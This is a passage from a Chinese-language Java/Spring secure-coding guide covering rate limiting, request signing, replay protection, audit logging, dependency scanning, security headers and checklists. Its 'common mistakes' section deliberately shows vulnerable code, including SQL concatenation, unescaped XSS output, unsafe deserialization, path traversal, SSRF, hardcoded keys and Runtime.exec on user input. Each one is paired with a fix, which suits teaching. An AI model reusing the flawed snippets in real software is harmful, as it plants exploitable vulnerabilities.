        RateLimiter limiter = limiters.computeIfAbsent(key, 
            k -> RateLimiter.create(rateLimit.permitsPerSecond()));

        if (!limiter.tryAcquire(rateLimit.timeout(), TimeUnit.MILLISECONDS)) {
            throw new BusinessException("请求过于频繁，请稍后重试");
        }

        return point.proceed();
    }
}

@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface RateLimit {
    String key() default "";
    double permitsPerSecond() default 10;
    long timeout() default 0;
}

// 使用
@RateLimit(permitsPerSecond = 5)
@PostMapping("/send-sms")
public Result sendSms(@RequestParam String phone) {
    // 发送短信
}
```

```java
// 使用 Redis 实现分布式限流
@Component
public class RedisRateLimiter {

    private final StringRedisTemplate redisTemplate;

    // 滑动窗口限流
    public boolean isAllowed(String key, int maxRequests, int windowSeconds) {
        long now = System.currentTimeMillis();
        long windowStart = now - windowSeconds * 1000L;

        String redisKey = "rate_limit:" + key;

        // 移除窗口外的请求
        redisTemplate.opsForZSet().removeRangeByScore(redisKey, 0, windowStart);

        // 获取当前窗口请求数
        Long count = redisTemplate.opsForZSet().count(redisKey, windowStart, now);

        if (count != null && count >= maxRequests) {
            return false;
        }

        // 添加当前请求
        redisTemplate.opsForZSet().add(redisKey, String.valueOf(now), now);
        redisTemplate.expire(redisKey, windowSeconds, TimeUnit.SECONDS);

        return true;
    }
}
```

### 8.2 接口签名验证

```java
// 接口签名防篡改
@Component
public class SignatureVerifier {

    @Value("${api.secret-key}")
    private String secretKey;

    public boolean verify(HttpServletRequest request, String signature, long timestamp) {
        // 1. 验证时间戳（防止重放攻击）
        long now = System.currentTimeMillis();
        if (Math.abs(now - timestamp) > 5 * 60 * 1000) {  // 5 分钟有效期
            return false;
        }

        // 2. 构建签名字符串
        StringBuilder sb = new StringBuilder();
        sb.append(request.getMethod()).append("\n");
        sb.append(request.getRequestURI()).append("\n");
        sb.append(timestamp).append("\n");

        // 按字母顺序排列参数
        TreeMap<String, String> params = new TreeMap<>();
        request.getParameterMap().forEach((k, v) -> params.put(k, v[0]));
        params.forEach((k, v) -> sb.append(k).append("=").append(v).append("&"));

        // 3. 计算签名
        String expectedSignature = hmacSha256(sb.toString(), secretKey);

        // 4. 比较签名（使用时间恒定比较，防止时序攻击）
        return MessageDigest.isEqual(
            expectedSignature.getBytes(), 
            signature.getBytes()
        );
    }

    private String hmacSha256(String data, String key) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(key.getBytes(), "HmacSHA256"));
            byte[] hash = mac.doFinal(data.getBytes());
            return Base64.getEncoder().encodeToString(hash);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```

### 8.3 防重放攻击

```java
@Component
public class NonceValidator {

    private final StringRedisTemplate redisTemplate;

    // 验证 nonce（一次性随机数）
    public boolean validateNonce(String nonce, long timestamp) {
        // 1. 检查时间戳
        long now = System.currentTimeMillis();
        if (Math.abs(now - timestamp) > 5 * 60 * 1000) {
            return false;
        }

        // 2. 检查 nonce 是否已使用
        String key = "nonce:" + nonce;
        Boolean isNew = redisTemplate.opsForValue().setIfAbsent(key, "1", 10, TimeUnit.MINUTES);
        
        return Boolean.TRUE.equals(isNew);
    }
}

// 使用
@PostMapping("/transfer")
public Result transfer(@RequestBody TransferRequest request,
                       @RequestHeader("X-Nonce") String nonce,
                       @RequestHeader("X-Timestamp") long timestamp,
                       @RequestHeader("X-Signature") String signature) {
    // 验证 nonce
    if (!nonceValidator.validateNonce(nonce, timestamp)) {
        throw new BusinessException("请求已过期或重复");
    }
    // 验证签名
    // ...
}
```

### 8.4 越权访问防护

```java
// 水平越权防护（访问他人数据）
@Service
public class OrderService {

    @PreAuthorize("@orderSecurity.isOwner(#orderId)")
    public Order getOrder(Long orderId) {
        return orderRepository.findById(orderId).orElseThrow();
    }
}

@Component("orderSecurity")
public class OrderSecurityChecker {

    private final OrderRepository orderRepository;

    public boolean isOwner(Long orderId) {
        Long currentUserId = SecurityUtils.getCurrentUserId();
        Order order = orderRepository.findById(orderId).orElse(null);
        return order != null && order.getUserId().equals(currentUserId);
    }
}

// 垂直越权防护（访问高权限功能）
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
public Result deleteUser(@PathVariable Long id) {
    // 只有管理员能删除用户
}
```


---

## 9. 日志与审计

### 9.1 安全日志记录

```java
@Aspect
@Component
public class SecurityAuditAspect {

    private final Logger auditLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    @Around("@annotation(securityAudit)")
    public Object audit(ProceedingJoinPoint point, SecurityAudit securityAudit) throws Throwable {
        String username = SecurityUtils.getCurrentUsername();
        String operation = securityAudit.operation();
        String ip = getClientIp();
        long startTime = System.currentTimeMillis();

        try {
            Object result = point.proceed();
            long duration = System.currentTimeMillis() - startTime;
            
            auditLogger.info("AUDIT|SUCCESS|{}|{}|{}|{}|{}ms", 
                username, operation, ip, getArgs(point), duration);
            
            return result;
        } catch (Exception e) {
            long duration = System.currentTimeMillis() - startTime;
            
            auditLogger.warn("AUDIT|FAIL|{}|{}|{}|{}|{}ms|{}", 
                username, operation, ip, getArgs(point), duration, e.getMessage());
            
            throw e;
        }
    }

    private String getClientIp() {
        HttpServletRequest request = ((ServletRequestAttributes) 
            RequestContextHolder.getRequestAttributes()).getRequest();
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty()) {
            ip = request.getRemoteAddr();
        }
        return ip;
    }

    private String getArgs(ProceedingJoinPoint point) {
        // 脱敏处理参数
        return Arrays.stream(point.getArgs())
            .map(arg -> arg == null ? "null" : arg.toString())
            .collect(Collectors.joining(","));
    }
}

@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface SecurityAudit {
    String operation();
}

// 使用
@SecurityAudit(operation = "用户登录")
@PostMapping("/login")
public Result login(@RequestBody LoginRequest request) {
    // ...
}

@SecurityAudit(operation = "删除用户")
@DeleteMapping("/users/{id}")
public Result deleteUser(@PathVariable Long id) {
    // ...
}
```

### 9.2 登录日志

```java
@Entity
@Table(name = "sys_login_log")
public class LoginLog {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String username;
    private String ip;
    private String location;
    private String browser;
    private String os;
    private Integer status;  // 0失败 1成功
    private String message;
    private LocalDateTime loginTime;
}

@Service
public class LoginLogService {

    private final LoginLogRepository loginLogRepository;

    @Async
    public void recordLogin(String username, boolean success, String message) {
        HttpServletRequest request = ((ServletRequestAttributes) 
            RequestContextHolder.getRequestAttributes()).getRequest();

        LoginLog log = new LoginLog();
        log.setUsername(username);
        log.setIp(getClientIp(request));
        log.setLocation(getLocation(log.getIp()));
        log.setBrowser(getBrowser(request));
        log.setOs(getOs(request));
        log.setStatus(success ? 1 : 0);
        log.setMessage(message);
        log.setLoginTime(LocalDateTime.now());

        loginLogRepository.save(log);
    }

    private String getClientIp(HttpServletRequest request) {
        String[] headers = {"X-Forwarded-For", "X-Real-IP", "Proxy-Client-IP"};
        for (String header : headers) {
            String ip = request.getHeader(header);
            if (ip != null && !ip.isEmpty() && !"unknown".equalsIgnoreCase(ip)) {
                return ip.split(",")[0].trim();
            }
        }
        return request.getRemoteAddr();
    }
}
```

### 9.3 操作日志

```java
@Entity
@Table(name = "sys_operation_log")
public class OperationLog {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String module;       // 模块
    private String operation;    // 操作
    private String method;       // 方法
    private String params;       // 参数
    private String result;       // 结果
    private Long duration;       // 耗时
    private String username;     // 操作人
    private String ip;
    private LocalDateTime createTime;
}

@Aspect
@Component
public class OperationLogAspect {

    @Around("@annotation(operationLog)")
    public Object around(ProceedingJoinPoint point, OperationLog operationLog) throws Throwable {
        long startTime = System.currentTimeMillis();
        Object result = null;
        Exception exception = null;

        try {
            result = point.proceed();
            return result;
        } catch (Exception e) {
            exception = e;
            throw e;
        } finally {
            saveLog(point, operationLog, result, exception, 
                System.currentTimeMillis() - startTime);
        }
    }

    @Async
    void saveLog(ProceedingJoinPoint point, OperationLog annotation, 
                 Object result, Exception exception, long duration) {
        // 保存日志
    }
}
```

---

## 10. 依赖安全

### 10.1 依赖漏洞扫描

```xml
<!-- pom.xml 添加 OWASP 依赖检查插件 -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>8.4.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFiles>
            <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
        </suppressionFiles>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

```bash
# 执行漏洞扫描
mvn dependency-check:check

# 生成报告
mvn dependency-check:aggregate
```

### 10.2 依赖版本管理

```xml
<!-- 使用 dependencyManagement 统一管理版本 -->
<dependencyManagement>
    <dependencies>
        <!-- Spring Boot BOM -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-dependencies</artifactId>
            <version>2.7.18</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>

<!-- 使用 versions-maven-plugin 检查更新 -->
<plugin>
    <groupId>org.codehaus.mojo</groupId>
    <artifactId>versions-maven-plugin</artifactId>
    <version>2.16.0</version>
</plugin>
```

```bash
# 检查依赖更新
mvn versions:display-dependency-updates

# 检查插件更新
mvn versions:display-plugin-updates
```

### 10.3 排除危险依赖

```xml
<!-- 排除有漏洞的传递依赖 -->
<dependency>
    <groupId>com.example</groupId>
    <artifactId>some-library</artifactId>
    <version>1.0.0</version>
    <exclusions>
        <exclusion>
            <groupId>log4j</groupId>
            <artifactId>log4j</artifactId>
        </exclusion>
    </exclusions>
</dependency>

<!-- 强制使用安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- 修复 Log4Shell 漏洞 -->
</dependency>
```

---

## 11. 安全响应头

### 11.1 配置安全响应头

```java
@Configuration
@EnableWebSecurity
public class SecurityHeadersConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers()
            // X-Content-Type-Options: 防止 MIME 类型嗅探
            .contentTypeOptions()
            .and()
            // X-Frame-Options: 防止点击劫持
            .frameOptions().deny()
            .and()
            // X-XSS-Protection: 启用浏览器 XSS 过滤
            .xssProtection().block(true)
            .and()
            // Strict-Transport-Security: 强制 HTTPS
            .httpStrictTransportSecurity()
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)
            .and()
            // Content-Security-Policy
            .contentSecurityPolicy(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "font-src 'self'; " +
                "frame-ancestors 'none'"
            )
            .and()
            // Referrer-Policy
            .referrerPolicy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
            .and()
            // Permissions-Policy
            .permissionsPolicy(policy -> policy
                .policy("geolocation=(), microphone=(), camera=()")
            );

        return http.build();
    }
}
```

### 11.2 响应头说明

| 响应头 | 作用 | 推荐值 |
|--------|------|--------|
| X-Content-Type-Options | 防止 MIME 嗅探 | nosniff |
| X-Frame-Options | 防止点击劫持 | DENY 或 SAMEORIGIN |
| X-XSS-Protection | 浏览器 XSS 过滤 | 1; mode=block |
| Strict-Transport-Security | 强制 HTTPS | max-age=31536000; includeSubDomains |
| Content-Security-Policy | 内容安全策略 | 根据需求配置 |
| Referrer-Policy | 控制 Referer 头 | strict-origin-when-cross-origin |
| Permissions-Policy | 控制浏览器功能 | 禁用不需要的功能 |

---

## 12. 常见错误与解决方案

### 12.1 SQL 注入漏洞

```java
// 错误：字符串拼接
String sql = "SELECT * FROM users WHERE id = " + id;

// 正确：参数化查询
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setLong(1, id);
```

### 12.2 XSS 漏洞

```java
// 错误：直接输出用户输入
response.getWriter().write("<div>" + userInput + "</div>");

// 正确：编码输出
response.getWriter().write("<div>" + Encode.forHtml(userInput) + "</div>");
```

### 12.3 敏感信息泄露

```java
// 错误：异常信息暴露给用户
@ExceptionHandler(Exception.class)
public Result handleException(Exception e) {
    return Result.error(e.getMessage());  // 可能泄露敏感信息
}

// 正确：返回通用错误信息
@ExceptionHandler(Exception.class)
public Result handleException(Exception e) {
    log.error("系统异常", e);  // 记录详细日志
    return Result.error("系统繁忙，请稍后重试");  // 返回通用信息
}
```

### 12.4 不安全的反序列化

```java
// 错误：直接反序列化不可信数据
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // 危险！

// 正确：使用白名单或安全的序列化方式
// 1. 使用 JSON 代替 Java 序列化
// 2. 使用 ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.*;!*"
);
ois.setObjectInputFilter(filter);
```

### 12.5 路径穿越

```java
// 错误：直接使用用户输入的文件名
String filename = request.getParameter("file");
File file = new File("/uploads/" + filename);  // 危险！

// 正确：验证和规范化路径
String filename = request.getParameter("file");
// 移除路径分隔符
filename = filename.replaceAll("[/\\\\]", "");
Path basePath = Paths.get("/uploads").toAbsolutePath().normalize();
Path filePath = basePath.resolve(filename).normalize();
// 确保在基础目录内
if (!filePath.startsWith(basePath)) {
    throw new SecurityException("非法路径");
}
```

### 12.6 SSRF 漏洞

```java
// 错误：直接请求用户提供的 URL
String url = request.getParameter("url");
HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();

// 正确：验证 URL
public boolean isUrlSafe(String url) {
    try {
        URL parsedUrl = new URL(url);
        String host = parsedUrl.getHost();
        
        // 禁止内网地址
        InetAddress address = InetAddress.getByName(host);
        if (address.isLoopbackAddress() || 
            address.isSiteLocalAddress() ||
            address.isLinkLocalAddress()) {
            return false;
        }
        
        // 白名单域名
        Set<String> allowedHosts = Set.of("api.example.com", "cdn.example.com");
        return allowedHosts.contains(host);
    } catch (Exception e) {
        return false;
    }
}
```


### 12.7 硬编码敏感信息

```java
// 错误：硬编码密码
String password = "admin123";
String apiKey = "sk-1234567890abcdef";

// 正确：使用配置或密钥管理
@Value("${db.password}")
private String password;

// 或使用 Vault、AWS Secrets Manager 等
```

### 12.8 不安全的随机数

```java
// 错误：使用 Random 生成安全相关的随机数
Random random = new Random();
String token = String.valueOf(random.nextLong());  // 可预测！

// 正确：使用 SecureRandom
SecureRandom secureRandom = new SecureRandom();
byte[] bytes = new byte[32];
secureRandom.nextBytes(bytes);
String token = Base64.getUrlEncoder().encodeToString(bytes);
```

---

## 13. 安全检查清单

### 13.1 开发阶段检查

```
□ 输入验证
  □ 所有用户输入都经过验证
  □ 使用白名单而非黑名单
  □ 验证数据类型、长度、格式、范围

□ 输出编码
  □ HTML 上下文使用 HTML 编码
  □ JavaScript 上下文使用 JS 编码
  □ URL 参数使用 URL 编码
  □ SQL 使用参数化查询

□ 认证授权
  □ 密码使用 BCrypt 加密存储
  □ 实现登录失败锁定
  □ 敏感操作需要重新认证
  □ 实现最小权限原则

□ 会话管理
  □ 使用安全的会话 ID
  □ 登录后重新生成会话
  □ 设置合理的会话超时
  □ Cookie 设置 HttpOnly、Secure、SameSite

□ 敏感数据
  □ 敏感数据加密存储
  □ 传输使用 HTTPS
  □ 日志中脱敏处理
  □ 响应中脱敏处理

□ 错误处理
  □ 不向用户暴露详细错误
  □ 记录详细的错误日志
  □ 统一的异常处理
```

### 13.2 部署阶段检查

```
□ 服务器配置
  □ 禁用不必要的服务
  □ 更新系统和软件补丁
  □ 配置防火墙规则
  □ 使用非 root 用户运行

□ HTTPS 配置
  □ 使用有效的 SSL 证书
  □ 禁用不安全的协议（SSLv3, TLS 1.0/1.1）
  □ 配置安全的密码套件
  □ 启用 HSTS

□ 安全响应头
  □ X-Content-Type-Options: nosniff
  □ X-Frame-Options: DENY
  □ X-XSS-Protection: 1; mode=block
  □ Content-Security-Policy
  □ Strict-Transport-Security

□ 日志监控
  □ 记录安全相关事件
  □ 配置日志告警
  □ 定期审查日志
  □ 日志安全存储
```

### 13.3 运维阶段检查

```
□ 定期安全扫描
  □ 漏洞扫描
  □ 依赖检查
  □ 代码审计
  □ 渗透测试

□ 应急响应
  □ 制定应急预案
  □ 定期演练
  □ 备份恢复测试
  □ 安全事件响应流程

□ 持续监控
  □ 异常登录检测
  □ 异常流量检测
  □ 敏感操作告警
  □ 系统资源监控
```

### 13.4 安全编码规范

```java
// 1. 永远不要信任用户输入
public void process(String userInput) {
    // 验证
    if (!isValid(userInput)) {
        throw new IllegalArgumentException("非法输入");
    }
    // 清理
    String sanitized = sanitize(userInput);
    // 使用
    doSomething(sanitized);
}

// 2. 使用安全的 API
// 错误
Runtime.getRuntime().exec(userInput);
// 正确
ProcessBuilder pb = new ProcessBuilder(allowedCommand, sanitizedArg);

// 3. 最小权限原则
// 数据库用户只授予必要权限
// GRANT SELECT, INSERT, UPDATE ON app.* TO 'appuser'@'localhost';

// 4. 安全默认值
public class Config {
    private boolean debugMode = false;  // 默认关闭
    private boolean httpsOnly = true;   // 默认开启
}

// 5. 失败安全
public boolean hasPermission(User user, Resource resource) {
    try {
        return checkPermission(user, resource);
    } catch (Exception e) {
        log.error("权限检查失败", e);
        return false;  // 失败时拒绝访问
    }
}

// 6. 避免信息泄露
// 错误
if (user == null) {
    throw new Exception("用户 " + username + " 不存在");
}
// 正确
if (user == null || !passwordEncoder.matches(password, user.getPassword())) {
    throw new Exception("用户名或密码错误");
}
```

---

## 参考资料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Spring Security 官方文档](https://docs.spring.io/spring-security/reference/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
